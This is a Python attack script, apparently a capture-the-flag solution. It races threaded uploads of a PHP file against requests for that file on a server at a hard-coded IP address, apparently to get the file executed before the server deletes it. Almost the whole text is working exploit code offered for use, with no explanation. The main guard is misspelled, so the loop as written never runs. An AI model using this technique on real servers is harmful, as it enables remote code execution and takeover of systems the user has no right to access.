import threading
import sys
import string
import requests
r = requests.session()

url = "http://62.84.114.238/"
cookie = {"PHPSESSID": "aa"}


def upload():
    with open("a.php", "rb") as a_file:
        file_dict = {"data": a_file}
        response = r.post(url, files=file_dict, data={
                          "data": "cc"}, cookies=cookie)
        print(response.text)


def getphp():
    a = r.get(url+"upload/f91a0679e8a63c554b5bfe63ee4cd46a/a.php")
    print(a.text)


def check():
    a = r.get(url+"upload/fc8ca0edacff450a1c725c8e924facba/cc.php")
    print(a.text)
    if "123" in a.text:
        exit()


if _name_ == "_main_":
    for i in range(1, 500):
        t = threading.Thread(target=upload)
        t1 = threading.Thread(target=getphp)
        #t2 = threading.Thread(target = check)
        t.start()
        t1.start()
       # t2.start()
